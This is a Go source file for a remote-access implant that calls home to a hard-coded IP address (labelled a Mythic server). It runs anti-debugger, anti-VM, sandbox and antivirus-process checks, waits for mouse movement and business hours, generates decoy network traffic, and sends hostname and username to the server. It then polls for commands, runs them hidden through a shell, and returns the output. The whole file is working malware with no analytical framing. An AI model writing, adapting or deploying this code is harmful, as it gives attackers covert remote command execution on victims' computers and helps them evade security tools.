package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	mythicURL = "https://37.27.249.191:7443"
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	mutexName = "Global\\WinServiceHost32"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	
	procIsDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")
	procGetCursorPos      = user32.NewProc("GetCursorPos")
	procCreateMutexW      = kernel32.NewProc("CreateMutexW")
	procGetSystemMetrics  = user32.NewProc("GetSystemMetrics")
)

type MythicCheckin struct {
	Action       string `json:"action"`
	IP           string `json:"ip"`
	OS           string `json:"os"`
	User         string `json:"user"`
	Host         string `json:"host"`
	PID          int    `json:"pid"`
	UUID         string `json:"uuid"`
	Architecture string `json:"architecture"`
	Domain       string `json:"domain"`
	IntegrityLevel int  `json:"integrity_level"`
}

type MythicResponse struct {
	Action     string `json:"action"`
	TaskID     string `json:"task_id"`
	UserOutput string `json:"user_output"`
	Completed  bool   `json:"completed"`
}

type MousePoint struct {
	X, Y int32
}

func DetectHostileEnvironment() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	
	ret, _, _ := procIsDebuggerPresent.Call()
	if ret != 0 {
		return true
	}
	
	hostileProcesses := []string{
		"ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
		"regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
		"sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
		"avp", "avast", "kaspersky", "norton", "mcafee", "malwarebytes", "defender",
	}
	
	for _, proc := range hostileProcesses {
		cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if output, err := cmd.Output(); err == nil {
			if strings.Contains(strings.ToLower(string(output)), proc) {
				return true
			}
		}
	}
	
	cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if output, err := cmd.Output(); err == nil {
		manufacturer := strings.ToLower(string(output))
		vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
		for _, vm := range vmStrings {
			if strings.Contains(manufacturer, vm) {
				return true
			}
		}
	}
	
	width, _, _ := procGetSystemMetrics.Call(0)
	height, _, _ := procGetSystemMetrics.Call(1)
	if width < 1024 || height < 768 {
		return true
	}
	
	if runtime.NumCPU() < 2 {
		return true
	}
	
	return false
}

func VerifyUserActivity() bool {
	var pos1, pos2 MousePoint
	
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
	time.Sleep(200 * time.Millisecond)
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
	
	return pos1.X != pos2.X || pos1.Y != pos2.Y
}

func IsBusinessHours() bool {
	now := time.Now()
	hour := now.Hour()
	weekday := now.Weekday()
	
	if weekday == time.Saturday || weekday == time.Sunday {
		return false
	}
	
	return hour >= 9 && hour <= 17
}

func RegisterWithMythic() error {
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
	
	payload := MythicCheckin{
		Action:         "checkin",
		IP:             "127.0.0.1",
		OS:             runtime.GOOS,
		User:           os.Getenv("USERNAME"),
		Host:           hostname,
		PID:            os.Getpid(),
		UUID:           uuid,
		Architecture:   runtime.GOARCH,
		Domain:         "",
		IntegrityLevel: 2,
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("POST", mythicURL+"/new_callback", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", userAgent)
	
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}

func GetMythicTasks() ([]map[string]interface{}, error) {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("GET", mythicURL+"/new_callback", nil)
	if err != nil {
		return nil, err
	}
	
	req.Header.Set("User-Agent", userAgent)
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	
	var tasks []map[string]interface{}
	json.Unmarshal(body, &tasks)
	
	return tasks, nil
}

func ExecuteCommand(command string) string {
	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.Output()
	if err != nil {
		return fmt.Sprintf("Error: %s", err.Error())
	}
	
	return string(output)
}

func SendMythicResponse(taskID, output string) error {
	response := MythicResponse{
		Action:     "post_response",
		TaskID:     taskID,
		UserOutput: base64.StdEncoding.EncodeToString([]byte(output)),
		Completed:  true,
	}
	
	jsonData, err := json.Marshal(response)
	if err != nil {
		return err
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("POST", mythicURL+"/new_callback", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", userAgent)
	
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}

func MaintainLegitimacy() {
	go func() {
		rand.Seed(time.Now().UnixNano())
		
		for {
			sleepTime := time.Duration(300+rand.Intn(600)) * time.Second
			time.Sleep(sleepTime)
			
			activities := []func(){
				func() {
					cmd := exec.Command("nslookup", "microsoft.com")
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					cmd.Run()
				},
				func() {
					cmd := exec.Command("ping", "-n", "1", "8.8.8.8")
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					cmd.Run()
				},
			}
			
			if len(activities) > 0 {
				activities[rand.Intn(len(activities))]()
			}
		}
	}()
}

func main() {
	if DetectHostileEnvironment() {
		os.Exit(0)
	}
	
	if !VerifyUserActivity() {
		time.Sleep(10 * time.Second)
		if !VerifyUserActivity() {
			os.Exit(0)
		}
	}
	
	if !IsBusinessHours() {
		now := time.Now()
		nextBusiness := now
		
		for nextBusiness.Weekday() == time.Saturday || 
			nextBusiness.Weekday() == time.Sunday || 
			nextBusiness.Hour() < 9 || 
			nextBusiness.Hour() >= 17 {
			nextBusiness = nextBusiness.Add(1 * time.Hour)
		}
		
		time.Sleep(nextBusiness.Sub(now))
	}
	
	mutexNamePtr, _ := syscall.UTF16PtrFromString(mutexName)
	mutex, _, _ := procCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexNamePtr)))
	if mutex == 0 {
		os.Exit(0)
	}
	
	MaintainLegitimacy()
	
	time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
	
	err := RegisterWithMythic()
	if err != nil {
		time.Sleep(time.Duration(60+rand.Intn(120)) * time.Second)
		os.Exit(0)
	}
	
	rand.Seed(time.Now().UnixNano())
	
	for {
		tasks, err := GetMythicTasks()
		if err == nil && len(tasks) > 0 {
			for _, task := range tasks {
				if taskID, ok := task["id"].(string); ok {
					if command, ok := task["command"].(string); ok {
						output := ExecuteCommand(command)
						SendMythicResponse(taskID, output)
					}
				}
			}
		}
		
		now := time.Now()
		var jitter time.Duration
		
		if now.Hour() >= 9 && now.Hour() <= 17 {
			jitter = time.Duration(3+rand.Intn(7)) * time.Second
		} else {
			jitter = time.Duration(10+rand.Intn(20)) * time.Second
		}
		
		time.Sleep(jitter)
	}
}